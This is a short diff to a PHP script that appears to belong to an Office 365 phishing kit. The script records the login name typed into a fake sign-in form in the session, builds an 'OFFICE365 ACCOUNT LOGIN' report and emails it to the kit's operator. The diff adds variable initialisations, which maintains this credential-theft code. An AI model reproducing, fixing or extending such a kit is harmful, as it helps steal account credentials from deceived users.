@@ -21,6 +21,7 @@
 
 	$_SESSION['username'] = $_POST['loginfmt'];
 
+	$Z118_MESSAGE = "";
 	$Z118_MESSAGE .= "
 		[  OFFICE365 ACCOUNT LOGIN]
 		[ LOGIN INFORMATION]
@@ -51,7 +52,7 @@
 	}
 
 	if ($send_results_to_email === "on") {
-
+		$Z118_HEADERS = "";
 		$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_POST['loginfmt']." ✪";
 		$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
 		$Z118_HEADERS .= $_POST['loginfmt']."\n";
